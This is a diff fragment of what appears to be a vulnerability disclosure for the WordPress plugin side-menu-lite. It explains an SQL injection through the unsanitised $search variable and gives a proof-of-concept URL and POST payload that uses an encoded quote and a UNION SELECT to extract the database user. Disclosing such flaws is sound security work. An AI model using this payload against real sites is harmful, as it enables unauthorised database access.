@@ -38,7 +38,9 @@
   We can see that the variable $search is finnally goes into the SQL query which result the SQL injection.
 ## Proof of Concept
 http://192.168.65.26/wp/wp-admin/admin.php?page=side-menu-lite&tab=list
+
 POST:
+
 s=aaaa%2527 union select 1,user(),3 -- a
 
 ![blockchain](https://github.com/pang0lin/CVEproject/blob/main/imgs/wordpress_side-menu-lite_sqli.png "Wordpress plugin side-menu-lite sqli")
